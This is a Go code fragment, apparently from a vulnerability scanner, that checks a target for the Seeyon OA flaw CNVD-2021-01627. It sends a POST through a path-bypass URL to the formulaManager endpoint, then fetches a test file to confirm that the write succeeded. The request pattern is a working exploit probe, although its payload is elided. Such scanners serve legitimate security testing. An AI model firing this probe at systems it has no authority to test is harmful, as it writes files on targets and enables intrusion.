...
func CNVD_2021_01627(u string) bool {
	...
	if req, err := utils.HttpRequset(u+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", "POST", data, false, nil); err == nil {
		if req.StatusCode == 500 {
			if req2, err := utils.HttpRequset(u+"/seeyon/vtest.txt", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && strings.Contains(req2.Body, "vtest") {
					log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon CNVD_2021_01627|%s\n", u+"/seeyon/vtest.txt"))
					return true
				}
			}
		}
